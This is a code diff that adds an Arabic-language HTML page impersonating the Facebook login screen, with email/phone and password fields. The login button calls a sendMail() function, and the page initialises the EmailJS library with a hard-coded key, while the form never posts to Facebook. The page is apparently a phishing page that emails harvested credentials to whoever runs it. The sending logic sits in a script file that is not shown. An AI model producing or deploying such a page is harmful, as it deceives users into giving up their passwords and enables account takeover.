@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="icon" href="facebook.icon">
+</head>
+
+<body>
+  <div class="container">
+    <form action="#">
+      <h2><span class="black-text"> </span><span class="blue-text">Facebook</span></h2>
+      <p>تسجيل الدخول في فيسبوك</p>
+      <div class="input-group">
+        <label for="email"></label>
+        <input type="text" id="email" name="email" placeholder="رقم الهاتف المحمول او البريد الالكتروني">
+      </div>
+      <div class="input-group">
+        <label for="password"></label>
+        <input type="password" id="password" name="password" placeholder="كلمه السر">
+      </div>
+      <button onclick="sendMail()" class="button button-primary button-pipaluk">تسجيل الدخول</button>
+      <p><a href="#">هل نسيت كلمة السر؟</a></p>
+      <hr>
+      <p>ليس لديك حساب؟ <a href="#">التسجيل في فيسبوك</a></p>
+      <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+      <script type="text/javascript">
+        emailjs.init('daqs6pj4IoTAJvQVh')
+      </script>
+    </form>
+  </div>
+  <script src="script .js"></script>
+</body>
+
+</html>
